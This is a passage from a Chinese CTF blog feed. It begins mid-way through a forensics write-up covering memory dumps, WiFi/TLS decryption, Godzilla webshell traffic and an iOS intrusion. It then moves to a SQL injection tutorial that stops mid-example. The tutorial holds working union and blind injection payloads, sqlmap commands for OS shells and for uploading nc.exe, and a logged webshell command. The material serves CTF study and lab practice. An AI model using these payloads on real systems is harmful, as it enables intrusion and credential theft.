--profile=Win7SP1x86_23418 cmdscan</code>，搜索四个文件的cmd进程，发现一样的，就按第一个弄，发现cmd里有导出文件的痕迹【后续知道imageinfo后一般情况下第一个就是对的:Win7SP1x64】</p><p><img src="https://api2.mubu.com/v3/document_image/bbaa366e-6ea4-42c7-8098-e709040aec1c-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 filescan |grep -E "rar|zip"</code>，搜索所有文件，找含zip|rar的，发现可疑文件MY_WIFI.zip，dump下来</p><p><img src="https://api2.mubu.com/v3/document_image/08f041bc-5517-4592-96a5-76ee5188ee68-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e4b2070 -D ./</code>【-Q是偏移量，-D是导出的文件夹，./意思是导出在当前文件夹、Q在信息的最左边一串数字】</p><p><img src="https://api2.mubu.com/v3/document_image/8e0303de-749b-4a59-9cb0-f906148b614f-11812322.jpg" alt="img"></p></li><li><p>导出文件为.dat文件，打开发现为加密的xml,🐖==！【密码在描述里，kali下压缩没有描述，所放到win环境里看！注释的描述信息有东西哇，发现密码在网卡的GUID里。==】（passwordis Network Adapter GUID）</p><p><img src="https://api2.mubu.com/v3/document_image/442e8739-b6af-4ffc-af65-b4458a9cc8b5-11812322.jpg" alt="img"></p></li><li><p><span style="background:#FF9999;">网工人都知道网卡的GUID和接口绑定，上面那位师傅直接grep{ 了。我就一条命令完事，直接查接口！</span></p><ul><li><p><code>vol.py -f 'Windows 7-dde00fa9.vmem' --profile=Win7SP1x86_23418 filescan | grep "Interfaces"</code>找到guid密码</p><p><img src="https://api2.mubu.com/v3/document_image/341de8d4-0eb9-4492-818c-9f134562c5cd-11812322.jpg" alt="img"></p></li><li><p>也可以按花括号搜索<code>vol.py -f 'Windows 7-dde00fa9.vmem' --profile=Win7SP1x86_23418 filescan | grep "&#123;"</code>，结果很多！不如找接口</p></li></ul></li><li><p>解压出来是xml文件，AES、passPhrase、密码233@114514_qwe，应该是某个加密文件的密码，题目里也只剩下一个东西被加密了，那就是客户端pcap了。</p><p><img src="https://api2.mubu.com/v3/document_image/c1ec4a75-4924-47e1-af97-1ae5462ae181-11812322.jpg" alt="img"></p></li><li><p>分析客户端wifi，发现只有一个wifi，对流量进行解密</p><p><img src="https://api2.mubu.com/v3/document_image/e674d2c4-436a-4e83-b235-010724a23fa4-11812322.jpg" alt="img"></p></li><li><p>用kali自带WiFi工具解密<code>airdecap-ng -e My_Wifi -p 233@114514_qwe  客户端.cap</code>-e 指定目标网络ssid，-p密码，ssid在pacp里，解码后有新的东西出现，对cap包流量分析</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193107506.png" alt="image-20211209193107506"></p><ul><li><p><span style="background:#bbffff;">也可用wireshark自带工具解密，设置方法：编辑-首选项-Protocols-IEEE802.11-Edit,</span>设置好后点击ok就可以看到解密的流量包了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/5da66504-a615-4db3-97fe-ea4cd042357b-11812322.jpg" alt="img"></p></li></ul></li></ul><h4 id="流量分析哥斯拉解码">2.流量分析+哥斯拉解码</h4><p>已知小王往 upload-labs 上传木马后进行了 cat/flag，小王在根目录下读取了flag，那么这个flag应该在发出请求后哥斯拉响应的数据中【解密后的客户端】。</p><ul><li><p>现在是需要在客户端获取服务器响应的数据：</p></li><li><p>同样是http协议，过滤下，多跟踪几个数据，进行解密。</p></li><li><p>尝试解密了几个都发现不是flag，发现某个http流，最终成功复现出flag</p></li></ul><ol type="1"><li>分析服务器端，过滤http，发现post上传1.php，分析几个post包，追踪，发现有三个小包（==哥斯拉三次流量==，后两包bodybake后都是webshell加密代码，第一个包pass也是，key利用下面的重要函数反解得到包含run、bypass_open_basedir、formatParameter、evalFunc等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能）</li></ol><ul><li><p>🐖==！：得到加密重要函数，这一看就是哥斯拉的马，并且使用了xor_base64的加密器，配置也是默认配置==，密码:pass密钥:key,也拿到了服务器ip:42.192.84.152,所以我们返回到wifi流量包，直接筛选服务器ip的包，找到几个哥斯拉加密的返回包进行解密流量</p><p><img src="https://api2.mubu.com/v3/document_image/e3ed2a28-8417-464a-97fb-3a13f1956ebe-11812322.jpg" alt="img"></p></li><li><p>解密包的代码：（加解密函数因为异或的原因，都是encode），马里的重要函数<code>encode(base64_decode($_POST[$pass]),$key);</code>=》<strong>数据在接收时，<span style="background:#FF9999;">除了采用前 16 位和后 16为的干扰字符外</span>，内容采用 gzip 压缩编码 + 异或 + base64</strong>=》编写解密代码【<span style="background:#FF9999;">注意要先删除前16位和后16位字符再执行代码</span>】</p><p><img src="https://api2.mubu.com/v3/document_image/9b421c10-5f30-48d7-a86b-15be843cd20d-11812322.jpg" alt="img"></p></li><li><p>对解密后的客户端过滤http，发现无get/post，分析最后一个http回显（或者可疑的200包，只有一行txt/html返回值的）原始数据包返回<code>72a9c691ccdaab98fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=b4c4e1f6ddd2a488</code>==去掉前面的16位和后面的16位==（代码审计）得到<code>fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=</code>，放到前面的解密代码在线php解密，得到flag<code>flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193723030.png" alt="image-20211209193723030"></p><ul><li>（也可这样：最后解哥斯拉的方法，其他师傅他们是直接用放进哥斯拉里面，然后让哥斯拉帮忙解码，看到flag的）</li></ul></li></ul><h2 id="ios">ios</h2><p><span style="background:#FFDBBB;">收获：wireshark检索特定内容 +TLS流量包解密 + 查看端口扫描、导出分组详情</span></p><h3 id="准备知识-4">📚准备知识</h3><blockquote><ul><li>【<a href="https://webcache.googleusercontent.com/search?q=cache:8RUq5kprt08J:https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html+&amp;cd=6&amp;hl=zh-CN&amp;ct=clnk&amp;gl=us">TLS/SSL阮一峰详解原理</a>】</li><li><a href="https://blog.csdn.net/walleva96/article/details/106844033">详细：wireshark解密tls，CSDN</a></li><li><a href="https://www.cnblogs.com/lv6965/p/7859925.html">使用wireshark分析TLS</a></li><li><a href="https://segmentfault.com/a/1190000018746027">思否：，图文详解，如何用wireshark 抓包 TLS 封包</a></li></ul></blockquote><h3 id="解题-4">✍解题</h3><p>Ios题目描述：一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p><ul><li><p>10.1黑客所控制的C&amp;C服务器IP是______3.128.156.159_______。</p><ul><li>筛选http contains"github"，追踪具体的tcp流，可以发现这⾥有转发操作</li></ul><p><img src="https://api2.mubu.com/v3/document_image/ddf57b05-2f8f-406c-b568-da87be40f707-11812322.jpg" alt="img"></p></li><li><p>10.2黑客利用的Github开源项目的名字是_<em>Stowaway</em>___。（如有字母请全部使用小写）</p><ul><li>同上一题的包</li></ul></li><li><p>10.3通讯加密密钥的明文是_<strong><em>hack4sec</em></strong>_____。</p><ul><li>打开上边那个工具的主页，看下readme，发现-s后跟的就是密钥</li></ul></li></ul><h4 id="tls流量包解密">TLS流量包解密</h4><p>10.4黑客通过SQL盲注拿到了一个敏感数据，内容是______746558f3-c841-456b-85d7-d6c0f2edabb2______。</p><ul><li><p><strong>部分存在TLS加密的流量需要用到秘钥进行解密</strong>，【<span style="background:#FF9999;">而例如chrome，firefox， curl等应用， 当设置了SSLKEYLOGFILE的环境变量， 就能够获取到每次对话产生的keylog文件。<strong>利用每次对话中，存储下来的keylog来解密报文</strong>是一种非常普遍的手段</span>】</p></li><li><p>key.txt中的<strong>“Master-Key”为主密钥，主密钥并不是最终加解密使用的密钥</strong>，会话密钥是通过主密钥再进一步计算获得。</p></li><li><p>编辑-&gt;首选项-&gt;protocols-&gt;TLS导入文件，要导入https证书了，(把key.log中rsasession都去了只留CLIENT_RANDOM文件然后导入tls文件)【可去可不去】，</p><p><img src="https://api2.mubu.com/v3/document_image/203c83ea-0460-4652-838a-6d3c9658a7f6-11812322.jpg" alt="img"></p></li><li><p>发现新出现的http2有注入的内容，然后筛一下http2流（<code>ip.dst == 192.168.1.12 &amp;&amp;http2</code>），到处文件可以看到sql盲注的内容，然后就导出分组解析结果-&gt;csv-&gt;改后缀为txt-&gt;导入bakeurl解码-&gt;导出文件，挨个数或者写脚本看下盲注的内容。【ctrl fpassword,4,第一个前面就是猜对的字母】</p><p><img src="https://api2.mubu.com/v3/document_image/e3a4ae51-28eb-4815-b18e-338f29d16c5a-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/64da732b-43bb-4499-a7c0-99ad0b13d44f-11812322.jpg" alt="img" style="zoom:50%;"></p></li></ul><p>10.5黑客端口扫描的扫描器的扫描范围是_____10-499_______。（格式使用“开始端口-结束端口”，例如1-65535）</p><ul><li><p>\1.在Wireshark中，直接观察数据包：显示目标地址的端口号：打开编辑-&gt;首选项设置-&gt;列-&gt;按“添加”按钮-&gt;在字段类型中选择<code>Dest port(unresolved)</code>即可。发现连续端口扫描是10-499</p></li><li><p>\2.师傅们的wp：也可在linux用代码<code>$ tcpdump -n -r triffic.pcap  | awk '&#123;print $2$3&#125;' | sort -u &gt; su.txt</code>将数据流dump出来，观察被扫描的端口位置，从10开始到499<code>reading from file triffic.pcap, link-type EN10MB (Ethernet)</code></p><p><img src="https://api2.mubu.com/v3/document_image/1c4cc9bc-d569-408e-8e62-83323c05898f-11812322.jpg" alt="img" style="zoom:50%;"></p></li></ul><p>10.6被害者手机上被拿走了的私钥文件内容是____________。</p><p>10.7黑客访问/攻击了内网的几个服务器，IP地址为<code>_____172.28.0.2#192.168.1.12_______</code>。（多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p><ul><li>wireshark里被扫描的192.168.1.12和access.log里被写后门的172.28.0.2</li></ul><p>10.8黑客写入了一个webshell，其密码为<code>____fxxk________</code>。</p><pre><code class="hljs accesslog"><span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /favicon.ico HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">43</span> <span class="hljs-string">&quot;http://172.28.0.2//ma.php?fxxk=system(base64_decode(%27d2hvYW1p%27));&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span> <span class="hljs-string">&quot;-&quot;</span></code></pre><p>密码为fxxk</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入&amp;CTF例题</title>
    <link href="/2021/09/06/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/09/06/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍与原理">介绍与原理📖</h1><h2 id="tips">TIPS</h2><ol type="1"><li><p>爆不出来结果试试十六进制编码的名字【from不可，where可】，库名也可以用函数database()代替【<a href="https://saucer-man.com/information_security/101.html">参考</a>】</p><ul><li>十六进制：<strong>sql语句能用16进制地方的最好用16进制，因为单引号双引号可能造成一些错误</strong></li><li>不可16进制编码的地方：sql关键字：如from、select、from后的名字也不行</li><li>可16进制的：where条件的字段、函数参数</li></ul></li><li><p>盲注and or失败后试宽字节注入<code>%df%27 union select 1,2%23</code>【<strong>报错即注入成功</strong>】</p></li><li><p>流程：</p><p><strong>一般手工注入的姿势为：判断时什么注入，有无过滤关键词 --&gt;获取数据库用户、版本、当前数据库 --&gt; 获取数据库的某个表 --&gt;获取字段 --&gt; 获取数据</strong></p></li><li><p>几个常用函数：</p><ol type="1"><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@<span class="citation" data-cites="datadir">@datadir</span>——数据库路径</li><li>@<span class="citation" data-cites="version_compile_os">@version_compile_os</span>——操作系统版本</li></ol></li><li><p>这里一般要用到连接函数</p><ol type="1"><li>concat(str1,str2,...)直接连接字符串，没有分隔符</li><li>concat_ws(separator, str1,str2,...)连接字符串，中间用separator分割</li><li>group_concat()用来连接多行的值，用逗号分割</li></ol></li><li><p><span style="background:#FF9999;">注意！</span>不同的参数不一定都能注入，理论上都可以，但是有的是数字有的是字符注意区分不同的注入语法！</p></li><li><p>burpsuiteGET后面的参数注入时注意把空格变成<code>+</code>，否则认为是隔开符</p></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439842.png"></p><h2 id="sqlmap">sqlmap</h2><p><a href="https://www.jianshu.com/p/fa77f2ed788b">简书常用命令大全</a><a href="https://m.freebuf.com/sectool/164608.html">freebufsqlmap总结，大全，【很多】</a></p><p><a href="https://wooyun.kieran.top/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C">**乌云sqlmap手册</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">思维导图的博客+命令</a></p><p><img src="https://img-blog.csdnimg.cn/20190311094049471.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="2"></p><h3 id="技巧点">技巧点</h3><ol type="1"><li><p>要登陆的，登陆后生成cookie，sqlmap时要加上 <pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://127.0.0.1:8000/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=low&quot;</span> <span class="hljs-params">--batch</span></code></pre></p></li><li><p>对post请求表单式注入，可用两种方法</p></li></ol><ul><li>使用burpsuite抓包，将数据包内容复制下来保存在文本中，然后使用SQLMap-r进行post注入</li></ul><pre><code class="hljs moonscript">sqlmap -r \Desktop\xxx.txt <span class="hljs-comment">--batch</span></code></pre><ul><li>直接用--data "表单参数【form data】"或--forms自动解析表单<pre><code class="hljs jboss-cli">sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1:8000/vulnerabilities/sqli/&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=medium&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span></code></pre></li></ul><ol start="3" type="1"><li>针对dvwa高安全级别下，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转的<a href="https://www.jianshu.com/p/e263ea40fe25">wp</a></li></ol><ul><li>用<code>--second-order="xxxurl"</code></li><li>使用于查询数据提交、结果显示分别在2各个不同的页面中<pre><code class="hljs jboss-cli">sqlmap <span class="hljs-params">--url=</span><span class="hljs-string">&quot;http://localhost:8001/dvwa/vulnerabilities/sqli/session-input.php&quot;</span> <span class="hljs-params">--data=</span><span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-params">--second-order=</span><span class="hljs-string">&quot;http://localhost:8001/dvwa/vulnerabilities/sqli/&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=high; PHPSESSID=g5mep9dj1vmkjiha8qnpfpn2i7&quot;</span> <span class="hljs-params">--batch</span></code></pre></li><li>也可以保存文件后用第二种方法再--second</li><li>这时sqli.txt文件中对应是查询数据提交时的POST数据包的内容，其中已经包含有cookie信息、以及POST请求体中的Formdata数据，<strong>所以命令中不需要单独在写</strong></li></ul><ol start="4" type="1"><li><p>针对查询特定库/表/字段报错的=》编码绕过 &gt; 爆表名: &gt;?id=1%df%27 union select 1,2,table_name from information_schema.tableswhere table_schema=mydbs%23 &gt; 发现报错。。。可能有过滤 &gt;那么把mydbs转成16进制:0x6d79646273(..字符转16进制即可，要转对，有个网址16进制换是转错的。。浪费我好多时间)&gt; ?id=1%df%27 union select 1,2,table_name frominformation_schema.tables where table_schema=0x6d79646273%23</p></li><li><p>设置具体sql注入技术</p><p>--technique B 布尔盲注</p><p>--technique E 报错注入</p><p>--technique U union查询注入</p><p>--technique S 堆叠注入</p><p>--technique T 时间盲注</p><p>--technique Q 内联查询注入</p><pre><code class="hljs awk">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.121</span><span class="hljs-regexp">/sqli/</span>Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> --technique T --time-sec <span class="hljs-number">3</span> --dbs <span class="hljs-regexp">//</span>--time -sec 时间盲注时间为<span class="hljs-number">3</span></code></pre></li><li><p><strong>使用Sqlmap进行Cookie注入</strong></p><p>在SQLmap中有一个参数“--Level”,==当“leavel&gt;=2”时就会检测COOKIE后面的参数，当“level&gt;3”时将会检测User-Agent和Referer==,这为COOKIE的注入提供了便利：</p><p><pre><code class="hljs jboss-cli">sqlmap -u  http:<span class="hljs-string">//xxx.xx.xx.xx</span><span class="hljs-function">:xx</span>/test.php  <span class="hljs-params">--cookie</span> id=1 <span class="hljs-params">--dbs</span> <span class="hljs-params">--leavel</span> 2</code></pre></p></li><li><p>只有root才能读写文件，load_file</p></li><li><p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p></li><li><p>避免过多的错误请求被屏蔽，可用参数</p></li></ol><pre><code class="hljs ada"><span class="hljs-number">1</span>、<span class="hljs-comment">--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</span><span class="hljs-number">2</span>、<span class="hljs-comment">--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</span></code></pre><ol start="10" type="1"><li><p>指定参数：-p</p><p><strong>sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTPCookie头的值，当大于等于3的时候也会测试User-Agent和HTTPReferer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p"id,user-anget"</strong></p></li><li><p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p></li></ol><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://targeturl/param1/value1*/param2/value2/&quot;</span>sqlmap将会测试value1的位置是否可注入。</code></pre><ol start="12" type="1"><li><p>--prefix：前缀和--suffix：后缀</p><p>需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p><pre><code class="hljs sql">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id <span class="hljs-comment">--prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span>$query = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(’<span class="hljs-string">&quot; . $_GET[’id’] . &quot;</span>’) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span><span class="hljs-string">&quot;; </span><span class="hljs-string">这样执行的SQL语句变成：</span><span class="hljs-string">$query = &quot;</span><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(’<span class="hljs-number">1</span>’) &lt;PAYLOAD&gt; <span class="hljs-keyword">AND</span> (’abc’=’abc’) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span><span class="hljs-string">&quot;; </span></code></pre></li><li><p>--level:探测等级</p><p>5个等级，默认是1</p><p><strong>sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</strong></p><p>HTTP Cookie在level为2的时候就会测试，HTTPUser-Agent/Referer头在level为3的时候就会测试。</p><p>总之在你<strong>不确定哪个payload或者参数为注入点的时候</strong>，为了保证全面性，建议使用高的level值</p></li><li><p>--risk 风险等级</p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>为什么叫风险，<strong>例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</strong></p></li><li><p>还可以爆破数据库用户明文密码<strong>--passwords</strong></p></li><li><p>暴力破解</p><p><strong>--common-tables</strong>：暴力破解表名</p><pre><code class="hljs angelscript">适用环境：当使用--tables无法获取到数据库的表时，可以使用此参数<span class="hljs-number">1.</span>MySQL数据库版本小于<span class="hljs-number">5.0</span>，没有information_schema表。<span class="hljs-number">2</span>、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。<span class="hljs-number">3</span>、当前用户没有权限读取系统中保存数据结构的表的权限。</code></pre></li></ol><p><strong>--common-columns</strong>：暴力破解列名</p><ol start="17" type="1"><li><p>读文件：</p><p>--file-read "C:/example.txt"</p><pre><code class="hljs pgsql">前提:有权限、数据库为MySQL，PostgreSQL或Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span></code></pre></li></ol><p>18.上传文件</p><p>​--file-write,--file-dest，前提：当数据库为MySQL，PostgreSQL或MicrosoftSQLServer，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-string">&quot;/software/nc.exe.packed&quot;</span> --<span class="hljs-keyword">file</span>-dest <span class="hljs-string">&quot;C:/WINDOWS/Temp/nc.exe&quot;</span> -v <span class="hljs-number">1</span></code></pre><ol start="19" type="1"><li><p>运行操作系统命令</p><p><strong>--os-cmd</strong></p><p>--os-shell ：也可以模拟一个真实的shell，可以输入你想执行的命令</p><pre><code class="hljs dockerfile">$ python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</span> \--os-<span class="hljs-keyword">cmd</span><span class="bash"> id</span></code></pre></li><li><p>sqlmap还可以和msf联动，</p></li><li><p>权限问题：</p><pre><code class="hljs routeros">默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL<span class="hljs-built_in"> Server </span>2000默认是以SYSTEM权限运行，Microsoft SQL<span class="hljs-built_in"> Server </span>2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。</code></pre></li></ol><h2 id="手注">手注</h2><p><a href="https://www.jianshu.com/p/fcc5d8e69d68">简书，sql一些函数总结，精简结合实例易理解</a></p><p><a href="https://www.jianshu.com/p/54b630f1ec35">简书手注初级保姆级流程**</a></p><ol type="1"><li>探测字段数：用1，2，3测，或orderby2（测是不是两个字段）/3（测三个）</li><li>Mysql安装后默认会创建三个数据库：information_schema、mysql和test</li></ol><p>###利用information库手注 3. 获取当前数据库用户【假设字段为2】<pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">user</span>(),<span class="hljs-number">2</span> <span class="hljs-meta">#</span></code></pre> 4.获取所有数据库名称【information_schema库下的schemata表中保存着DBMS中的所有数据库名称信息】<pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,schema_name <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">#</span></code></pre></p><ol start="5" type="1"><li>获取当前数据库下<strong>所有表名</strong> <pre><code class="hljs sql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">#</span></code></pre></li><li>获取表中所有列名 <pre><code class="hljs sql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">#</span></code></pre></li><li>导出具体数据</li></ol><ul><li>一次性获取users表中<strong>所有行的</strong>user和password数据，用符合'--'连接每一组中user和password，每一组"user--password"又分别用逗号隔开，集中在一起输出结果<pre><code class="hljs sql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">#</span></code></pre></li><li>或者分别获取每一行数据 <pre><code class="hljs sql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">#</span></code></pre></li></ul><h3 id="注入类型">注入类型</h3><p>sqlmap 支持5种漏洞检测类型:</p><ul><li>基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and1=1(和没加and1=1结果保持一致) 和 and1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. )</li><li>基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int))来观察浏览器的响应是否等待了你设定的那个值如果等待了,则表示执行了sleep,则基本确定是存在sql注入的</li><li>基于错误的检测(组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),==如果报错则证明我们组合的查询语句特定的字符被应用了==,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.))</li><li>基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候则使用union联合查询搭配concat还进行获取更多的信息)</li><li>基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作)</li></ul><h3 id="数字型注入和字符型注入">数字型注入和字符型注入</h3><p><a href="https://www.jianshu.com/p/5edd7a58a69e">简书，精简**</a></p><ol type="1"><li>一个参数是int，一个是string</li><li>输入<code>1 and 1=2</code>，报错即为数字型注入【执行and逻辑判断】，否则为字符型注入（字符串内的<code>1 and 1=2</code>不执行and逻辑判断），要去利用单引号闭合来注入</li><li>数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</li></ol><h3 id="搜索注入">搜索注入</h3><p><a href="https://www.codenong.com/cs106446931/">个人博客，精简</a>类似字符型注入，不过参数处变成<code>'%xxx%'</code> ，注意要绕过% -几种绕过方法： <pre><code class="hljs gcode"><span class="hljs-string">&#x27;and 1=1 and &#x27;</span><span class="hljs-meta">%</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-meta">%</span><span class="hljs-string">&#x27; and 1=1--&#x27;</span><span class="hljs-meta">%</span><span class="hljs-string">&#x27; and 1=1 and &#x27;</span><span class="hljs-meta">%</span><span class="hljs-string">&#x27;=&#x27;</span></code></pre> eg: <pre><code class="hljs routeros">例如我们在搜索框输入 李%‘<span class="hljs-keyword">and</span>’1’=‘1’ <span class="hljs-keyword">and</span>%’=’SELECT * <span class="hljs-keyword">from</span> table where<span class="hljs-built_in"> users </span>like’%李%‘<span class="hljs-keyword">and</span>’1’=‘1’<span class="hljs-keyword">and</span>’%’=’%’</code></pre> -剩余爆库手段大体等于字符注入</p><h3 id="布尔盲注">布尔盲注</h3><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1‘">简单，简书手工布尔盲注</a></p><p>小例子： - 查询字段名中包含 username 的表 <pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%user%&#x27;</span>;</code></pre> - 查表名<pre><code class="hljs pgsql"><span class="hljs-keyword">AND</span> <span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-built_in">table_name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">tables</span> &gt; <span class="hljs-string">&#x27;A&#x27;</span></code></pre></p><ol type="1"><li><p>通过构造sql语句，通过判断语句是否<strong>执行成功</strong>来对数据进行猜解。【无回显，只返回对错】</p></li><li><p><strong>只返回true/false，不返回报错</strong>【返回报错则说明有union注入】</p></li><li><p>例如:</p><p>先判断当前数据库的长度<code>http://127.0.0.1/sqli-labs/Less-8/?id=1' and length(database())&gt;8 